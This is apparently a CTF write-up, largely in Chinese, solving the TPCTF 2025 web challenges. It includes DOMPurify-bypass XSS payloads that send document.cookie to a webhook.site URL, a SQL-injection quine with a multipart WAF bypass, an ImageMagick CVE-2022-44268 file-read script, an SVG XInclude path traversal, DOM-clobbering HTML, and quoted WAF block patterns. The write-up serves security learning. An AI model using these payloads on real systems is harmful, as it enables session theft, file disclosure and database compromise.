---
title: TPCTF 2025 Web Writeup
date: 2025-03-20
last_modified_at: 2025-03-20 15:30:00 +0800
categories: [CTF]
tags: [web, ctf, writeup, tpctf]
pin: false
math: true
mermaid: true
image:
  path: /assets/images/tpctf.png
  alt: TPCTF 2025 Web Challenges
---


## baby layout

* Web: [http://1.95.153.158:3000](http://1.95.153.158:3000/)
* Admin bot: [http://1.95.153.158:1337](http://1.95.153.158:1337/)

使用了 DOMPurify 来防护，使用的是最新的版本

参考：

* https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations
* https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes

Dom 在线解析：

* https://yeswehack.github.io/Dom-Explorer/frame

DOMPurify 默认允许的 tag 和 attr

* [DOMPurify/src/tags.ts at 3.2.4 · cure53/DOMPurify](https://github.com/cure53/DOMPurify/blob/3.2.4/src/tags.ts)

Poc

```json
{"layout":"<img src={{content}}>"}

{"content":"\" onerror=alert(1)>\"","layoutId":3}
```

最终 poc

```JSON
{"content":"\" onerror=fetch('https://webhook.site/f57e3466-a8a4-4a5c-968a-551c1543af38?flag='+document.cookie)>\"","layoutId":2}
```

## safe layout

思路：

1. 将 ALLOWED\_ATTR 完全置空。需要找到没有 attr 的构造方式，或者结合正则替换绕过？
2. 类似 gitlab issue 中结合其他 js 的用法，例如 ujs，但貌似页面没有加载其他 js。

    1. data-b aria-c 仍旧是可用的 `<div a="a" data-b="b" aria-c="c">`​
    2. [Prevent CSP bypass that use Rails&apos; ujs data links (#336138) · Issues · GitLab.org / GitLab · GitLab](https://gitlab.com/gitlab-org/gitlab/-/issues/336138)
3. CSS 注入？Flag 在 cookie 中而不是页面
4. CSRF？没有 CSP 防护，form 标签可以进行 CSRF，但 CSRF 应该也无法访问 cookie

```json
{"layout":"x<style><{{content}}/style><{{content}}img src=x onerror=alert()></style>"}

{"content":"","layoutId":5}
```

最终poc

```go
{"layout":"x<style><{{content}}/style><{{content}}img src=x onerror=fetch('https://webhook.site/f57e3466-a8a4-4a5c-968a-551c1543af38?flag='+document.cookie)></style>"}

{"content":"","layoutId":5}
```

## safe layout revenge

Poc

```go
{"layout":"x<style><{{content}}/style><{{content}}img src=x onerror=fetch('
https://webhook.site/c59b785d-cfd5-4936-bcad-e0da7994c7b4?flag='+document.cookie)></style>"}

{"content":"","layoutId":5}
```

```go
TPCTF{AlS0_r3M3M83r_t0_d1SA8l3_daTa_AND_aR1A}
```

## supersqli

使用Django框架编写网站，其配置文件settings.py中存在部分问题：

* 密钥硬编码，可能可伪造会话、密码重置等
* 未开启csrf保护！！！

```sql
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    #'django.middleware.csrf.CsrfViewMiddleware', <===
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
```

* 全开放主机配置，易遭受主机头攻击。

```sql
ALLOWED_HOSTS = ["*"]  # 允许任意域名访问
```

代码存在两个路由，分别是`index/`​和`flag/`​

```python
def index(request:HttpRequest):
    return HttpResponse('Welcome to TPCTF 2025')

def flag(request:HttpRequest):
    if request.method != 'POST':
        return HttpResponse('Welcome to TPCTF 2025')
    username = request.POST.get('username')
    if username != 'admin':
        return HttpResponse('you are not admin.')
    password = request.POST.get('password')
    users:AdminUser = AdminUser.objects.raw("SELECT * FROM blog_adminuser WHERE username='%s' and password ='%s'" % (username,password))
    try:
        assert password == users[0].password
        return HttpResponse(os.environ.get('FLAG'))
    except:
        return HttpResponse('wrong password')
```

​`flag/`​路由实现登录`admin`​用户即可得到flag，其中存在sql语句，可尝试sql注入。

但其后端存在一个反向代理服务，会进行监测，防范sql注入、rec攻击和sqlmap、nmap扫描等操作。(`main.go`​)

```go
const backendURL = "http://127.0.0.1:8000"
const backendHost = "127.0.0.1:8000"

var blockedIPs = map[string]bool{
    "1.1.1.1": true,
}

var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`)

var rcePattern = regexp.MustCompile(`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`)

var hotfixPattern = regexp.MustCompile(`(?i)(select)`)

var blockedUserAgents = []string{
    "sqlmap",
    "nmap",
    "curl",
}
```

### 思路

1. Quine 注入，union 查询的结果会再次进行比对

    1. https://blog.csdn.net/qq\_73767109/article/details/130350848
    2. https://www.anquanke.com/post/id/253570
    3. [DUCTF - sqli2022 challenge (web)](https://www.justinsteven.com/posts/2022/09/27/ductf-sqli2022/)
2. 先构造出 Quine 注入的 payload，再考虑绕过

    ```sql
    'union select 1,2,REPLACE(REPLACE('"union select 1,2,REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")--',CHAR(34),CHAR(39)),CHAR(46),'"union select 1,2,REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")--')--
    ```
3. 考虑 golang 与 django 之间 http 处理差异。

    ```HTTP
    POST /flag/ HTTP/1.1
    Host: 1.95.159.113
    sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Windows"
    Accept-Language: zh-CN,zh;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
    Connection: keep-alive
    Content-Length: 451

    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data; name="username"

    admin
    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data111; name="password"

    'union select 1,2,REPLACE(REPLACE('"union select 1,2,REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")--',CHAR(34),CHAR(39)),CHAR(46),'"union select 1,2,REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")--')--
    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
    ```

## thumbor 1

启动命令：

```bash
/bin/sh -c thumbor --port 8800 --conf=thumbor.conf -a wikimedia_thumbor.app.App
```

thumbor 是一个图像处理服务，开源产品

* [thumbor/thumbor-plugins: Optimizers and filters contributed by the Thumbor community](https://github.com/thumbor/thumbor-plugins)
* [wikimedia/operations-software-thumbor-plugins: Mirror from https://gerrit.wikimedia.org/g/operations/software/thumbor-plugins](https://github.com/wikimedia/operations-software-thumbor-plugins)

thumbor 的官方文档：

* [Configuration — Thumbor 7.7.4 documentation](https://thumbor.readthedocs.io/en/latest/configuration.html)

thumbor 的基本使用方式：

```bash
http://[服务器地址]:[端口]/thumbor/unsafe/[处理参数]/[图片URL]
http://192.168.85.128:8800/thumbor/unsafe/450x/Carrie.jpg
```

源码中可以定位路由位置：

* wikimedia\_thumbor/handler
* 发现一个命令执行的功能 wikimedia\_thumbor/shell\_runner

### 思路

1. Flag 在根目录
2. 挖掘 thumbor 框架的漏洞，python 框架
3. ImageMagick 6.9.10-23 的漏洞？

    1. [ImageMagick多个高危漏洞安全风险通告 - 安全内参 - 决策者的网络安全知识库](https://www.secrss.com/articles/51581)
    2. 有点像 CVE-2022-44268

        1. [duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC: CVE-2022-44268 ImageMagick Arbitrary File Read - Payload Generator](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC)
        2. [ImageMagick: The hidden vulnerability behind your online images - Metabase Q](https://www.metabaseq.com/threat/imagemagick-zero-days/)
        3. [CVE-2022-44268: Arbitrary File Disclosure in ImageMagick](https://ethicalhacking.uk/cve-2022-44268-dissecting-the-imagemagick-arbitrary-file-disclosure/#gsc.tab=0)
    3. 其他历史漏洞利用手法

        1. [ImageTragick](https://imagetragick.com/)
4. 官方文档有提到安全性：[Security — Thumbor 7.7.4 documentation](https://thumbor.readthedocs.io/en/latest/security.html) 好像没什么用

确认 CVE-2022-44268 可用性：
```bash
#!/bin/bash
if [ -z "$1" ]; then
    file="/etc/passwd"
else
    file="$1"
fi
pngcrush -text a "profile" "$file" ctf.png 
exiv2 -pS pngout.png 
convert pngout.png gopro.png 
identify -verbose gopro.png | grep -e "^[0-9a-f]*$" |  grep . | xxd -r -p
```

## thumbor 2
thumbor2 中原 poc 已经失效，至少 ImageMagic CVE 无法利用了。

似乎引入了 pandoc 依赖，但 ImageMagic 版本没变，少了 heic、jp2 组件。

```yaml
# thumbor1
Version: ImageMagick 6.9.10-23 Q16 x86_64 20190101 https://imagemagick.org
Copyright: © 1999-2019 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC Modules OpenMP 
Delegates (built-in): bzlib djvu fftw fontconfig freetype heic jbig jng jp2 jpeg lcms lqr ltdl lzma openexr pangocairo png tiff webp wmf x xml zlib

# thumbor2
Version: ImageMagick 6.9.10-23 Q16 x86_64 20190101 https://imagemagick.org
Copyright: © 1999-2019 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC Modules OpenMP 
Delegates (built-in): bzlib djvu fftw fontconfig freetype jbig jng jpeg lcms lqr ltdl lzma openexr pangocairo png tiff webp wmf x xml zlib
```

thumbor 中没有找到任何调用 pandoc 的地方。检查了 policy 安全策略也是一致的：

```yaml
identify -list policy
```

### 思路

1. 挖掘 thumbor 本身的漏洞

    1. [thumbor/thumbor: thumbor is an open-source photo thumbnail service by globo.com](https://github.com/thumbor/thumbor)
2. 挖掘 wikimedia\_thumbor 的漏洞

    1. 参考

        1. [operations/software/thumbor-plugins - Gitiles](https://gerrit.wikimedia.org/g/operations/software/thumbor-plugins)
        2. [Thumbor - Wikitech](https://wikitech.wikimedia.org/wiki/Thumbor)
    2. wikimedia\_thumbor 是为了解决 thumbor 不支持大文件传输的问题，其文件类型的检测是通过 thumbor 框架完成的。
3. 寻找与 pandoc 相关的利用？感觉没有任何调用点
4. ImageMagic 其他利用方式，可以在 github issue 中找一找

    1. Msl 脚本文件利用？但 thumbor 在处理的时候似乎没法直接注入参数，文件名不可控。wikimedia-thumbor 中也没有直接处理 msl 文件的地方。

        ```yaml
        convert msl:msl.msl null:

        # msl.msl
        <?xml version="1.0" encoding="UTF-8"?>
        <msl>
          <image size="100x100">
            <read filename="mvg:/flag" />
            <write filename="/tmp/xxxx" />
          </image>
        </msl>
        ```
    2. Svg 文件的利用？svg 可以包含 msl，但 wikimedia-thumbor 使用 rsvg-convert 进行处理，不是 ImageMagick。再找找别的文件格式？
    3. CVE-2023-34152 貌似是个误报

        1. [RCE (shell command injection) vulnerability in \OpenBlob\ with \--enable-pipes\ configured · Issue #6339 · ImageMagick/ImageMagick](https://github.com/ImageMagick/ImageMagick/issues/6339?source=post_page-----04db2f2bf9e9---------------------------------------)
    4. Ghostscript contains multiple -dSAFER sandbox bypass vulnerabilities，但是题目环境默认禁止了 Ghostscript

        1. [potential exploit through ghost script in image magick · Issue #1262 · ImageMagick/ImageMagick](https://github.com/ImageMagick/ImageMagick/issues/1262)
    5. CVE-2023-34153 video 参数注入，需要可控参数，还需要尝试一下

        1. [Shell command injection vulnerability via \`video:vsync\` or \`video:pixel-format\` options in VIDEO encoding/decoding. · Issue #6338 · ImageMagick/ImageMagick](https://github.com/ImageMagick/ImageMagick/issues/6338)
    6. CVE-2021-3781，Ghostscript 中的一个 RCE，刚好就是 6.9.10-23，Ghostscript  9.54 修复，目标为 9.50，但是好像又提到 Ubuntu 20.04 的 9.50~dfsg-5ubuntu4.3 中已修复。本地测试确实不行。

        1. [Security: shell escape using ghostscript · Issue #4172 · ImageMagick/ImageMagick](https://github.com/ImageMagick/ImageMagick/issues/4172)
        2. [duc-nt/RCE-0-day-for-GhostScript-9.50: RCE 0-day for GhostScript 9.50 - Payload generator](https://github.com/duc-nt/RCE-0-day-for-GhostScript-9.50)
    7. UAF？？？

        1. [heap-use-after-free in magick at dcm.c RelinquishDCMInfo · Issue #4947 · ImageMagick/ImageMagick](https://github.com/ImageMagick/ImageMagick/issues/4947)
5. Ffmpeg 利用

    1. [USN-6803-1: FFmpeg vulnerabilities - Ubuntu security notices - Ubuntu](https://ubuntu.com/security/notices/USN-6803-1)
6. ExifTool 利用，目标版本是 11.88，似乎在适用版本内，但利用不成功

    1. [UNICORDev/exploit-CVE-2021-22204: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution](https://github.com/UNICORDev/exploit-CVE-2021-22204)
7. Ghostscript 利用

    1. CVE-2024-29510，需要 -dSAFER 参数，目标似乎满足条件，测试完了，发现漏洞不存在。`ghostscript -q -dNODISPLAY -dBATCH -dSAFER CVE-2024-29510_testkit.ps`​

        1. [Attackers Exploiting Remote Code Execution Vulnerability in Ghostscript - SecurityWeek](https://www.securityweek.com/attackers-exploiting-remote-code-execution-vulnerability-in-ghostscript/)
        2. [CVE-2024-29510 - Exploiting Ghostscript using format strings — Codean Labs](https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/)，文中提到：也可能是您的发行版提供的版本太旧（\< v9.50），因此也不容易受到此 CVE 的影响。
8. Rsvg-convert 利用

    1. [CVE-2023-38633 Common Vulnerabilities and Exposures - SUSE](https://www.suse.com/security/cve/CVE-2023-38633.html)
    2. [When URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog](https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/)

最终 poc：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
  <rect width="300" height="300" style="fill:rgb(255,204,204);" />
  <text x="0" y="100">
    <xi:include
      href=".?../../../../../../../flag"
      parse="text"
      encoding="ASCII"
    >
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</svg>
```

## incognito (unsolved)
```bash
➜ tree /F
文件夹 PATH 列表
卷序列号为 561E-913B
E:.
│  .dockerignore
│  docker-compose.yml
│  Dockerfile
│  _media_file_task_76eaa3eb-a4da-4ce4-aa02-ac690521faba.zip
│
├─bot
│  │  index.js
│  │  package.json
│  │  pnpm-lock.yaml
│  │  visit.js
│  │
│  └─public
│          index.html
│
└─extension
        content.js
        manifest.json
        package.json
        pnpm-lock.yaml
```
题目提供了一个 bot，bot 额外安装了一个浏览器扩展(extension 目录)，该浏览器的扩展较为简单，当在隐私浏览模式下运行时，会向 /flag路径发送一个 POST 请求，请求中带上了 flag。

扩展源码如下：当 browser.extension.inIncognitoContext 存在时，即可得到 flag。
```js
if (browser.extension.inIncognitoContext) {
  fetch('/flag', {
    method: 'POST',
    body: 'fake{dummy}',
  });
} else {
  console.log('No flag for you!');
}
```
浏览器扩展依赖了一个叫做 webextension-polyfill 的第三方库。
```json
{
  "private": true,
  "dependencies": {
    "webextension-polyfill": "^0.12.0"
  }
}
```
manifest.json 内容如下：
```json
{
  "manifest_version": 3,
  "name": "Are you incognito?",
  "description": "Capture the flag in incognito mode.",
  "version": "0.1.0",
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "node_modules/webextension-polyfill/dist/browser-polyfill.min.js",
        "content.js"
      ]
    }
  ]
}

```

在 bot 环境中，当 bot 访问用户提供的 URL 时，Puppeteer会加载扩展（通过--load-extension=/extension参数）
，扩展系统会根据 manifest.json 的配置注入 content scripts 因此 browser-polyfill.min.js 会在每次 bot 访问页面时被加载。

browser-polyfill.js 是 Mozilla 的 WebExtension Polyfill 库的核心文件，它的主要作用是在 Chrome 浏览器中提供与 Firefox 兼容的 Promise-based WebExtension API。

> Promise-based WebExtension API 是一种现代化的浏览器扩展开发接口，它使用 JavaScript Promise 来处理异步操作，而不是传统的回调函数。这种 API 风格最初由 Firefox 引入，并逐渐成为浏览器扩展开发的推荐标准。W3C 浏览器扩展社区组正在努力标准化基于 Promise 的扩展 API。Firefox 已完全实现了 Promise-based API，Chrome 通过 Mozilla 的 webextension-polyfill 库可以使用这种 API 风格。

因此，我们需要为 bot 提供一个链接，bot 在访问之后，如果 browser.extension.inIncognitoContext 通过校验，则会将 flag 发送到 /flag 路由。

chrome 浏览器默认情况下是没有 browser 这个变量的，browser-polyfill.min.js 会将 `browser.*API` 映射到Chrome 的 `chrome.*API`

### 调试环境搭建
在本地 windows 中创建一个 debug 文件夹，编写 index.js，模拟 bot 的行为调用 pupeteer 访问远程服务。

```bash
npm init -y
```
index.js 内容如下，注意将 headless 设置为 false
```js
const puppeteer = require('puppeteer');

const sleep = (ms) => new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
  
async function debug(url){
    console.log(`start: ${url}`);

    const browser = await puppeteer.launch({
      headless: false,
      executablePath: 'chrome/win64-134.0.6998.35/chrome-win64/chrome.exe',
      args: [
        '--no-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--js-flags="--noexpose_wasm"',
        '--disable-extensions-except=E:\\work\\project\\ctf-archives\\TPCTF\\2025\\WEB\\incognito\\extension',
        '--load-extension=E:\\work\\project\\ctf-archives\\TPCTF\\2025\\WEB\\incognito\\extension',
      ],
    });
  
    try {
      const page = await browser.newPage();
      await page.goto(url, { timeout: 5000, waitUntil: 'domcontentloaded' });
    //   await sleep(5000);
    //   await page.close();
    } catch (err) {
      console.error(err);
    }
  
    // await browser.close();
    console.log(`end: ${url}`);
}

debug("http://192.168.85.128:19006/");
```
可以使用下面的命令安装 chrome test 特定版本：
- [Download Chromium](https://www.chromium.org/getting-involved/download-chromium/)
```bash
➜ npx @puppeteer/browsers install chrome@134.0.6998.35
Downloading chrome 134.0.6998.35 - 166.5 MB [====================] 100% 0.0s
chrome@134.0.6998.35 E:\work\project\ctf-archives\TPCTF\2025\WEB\incognito\debug\chrome\win64-134.0.6998.35\chrome-win64\chrome.exe
```
`node index.js` 运行 index.js，chrome 浏览器的开发者工具中就可以调试 browser-polyfill.min.js 了。不过位置需要注意，Sources --> Content scripts，默认情况下没有展开。

![](assets/2025-03-14-09-13-29.png)

手动刷新页面即可断下：

![](assets/2025-03-14-09-14-30.png)

### 利用流程分析
这道题我们需要通过 DOM 破坏覆盖变量 browser.extension.inIncognitoContext。browser 变量本身来自于 browser-polyfill.min.js。

browser-polyfill.min.js 源码大致如下：
```js
"use strict";

if (!(globalThis.chrome && globalThis.chrome.runtime && globalThis.chrome.runtime.id)) {
  throw new Error("This script should only be loaded in a browser extension.");
}

if (!(globalThis.browser && globalThis.browser.runtime && globalThis.browser.runtime.id)) {
  const CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE = "The message port closed before a response was received.";

  ...

  module.exports = wrapAPIs(chrome);
} else {
  module.exports = globalThis.browser;
}
```
分析其源码，globalThis 实际为 window 对象，`!(globalThis.browser && globalThis.browser.runtime && globalThis.browser.runtime.id)` 会判断当前 window 下是否已经存在 browser，browser.runtime 以及 browser.runtime.id，如果均已存在，则进入 else 分支，直接返回现有 browser，否则则会调用 wrapAPIs 创建一个新的 browser。

DOM 破坏的关键也在这个地方，我们可以通过 payload 构造出 browser 引用，并且同时创建多级引用：
1. browser.runtime.id 用于避免重新创建 browser
2. browser.extension.inIncognitoContext 用于拿到 flag

payload 的构造如下，由于 id 属性天然存在，所以只需要构造 browser.runtime 二层引用即可。
```html
<form id=browser name="runtime"></form>
<form id=browser name="extension">
    <input id=inIncognitoContext>
</form>


<form id="browser"></form> 
<form id="browser" name="runtime"> 
    <input name="id" value="clobbered">
</form>
<form id="browser" name="extension"> 
    <input name="inIncognitoContext" value="clobbered">
</form>
```
